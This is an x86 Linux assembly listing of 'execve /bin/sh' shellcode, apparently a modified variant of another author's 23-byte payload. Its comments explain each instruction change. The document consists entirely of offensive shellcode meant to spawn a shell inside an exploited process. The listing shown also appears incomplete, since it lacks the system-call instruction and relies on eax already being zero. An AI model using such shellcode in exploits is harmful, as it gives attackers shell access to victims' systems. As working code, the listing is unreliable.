


; Linux/x86 execve /bin/sh shellcode 23 bytes
; Original Author: Hamza Megahed

 
push eax                                ; we don't need to xor the eax , becuase we still wont have any NULL value in the end so why bother with it.                             
push 0x68732f2f                                      ; same 
push 0x6e69622f                                        ; same 
lea ebx , [esp]  ;                                         ;  here changed from mov ebx , esp 
push eax                                       ; same
push ebx                                  ; same 
lea ecx , [ esp ]                       ; here changed from mov ecx , esp 
add al , 11                  ; here change from mov al , 0xb
 

 

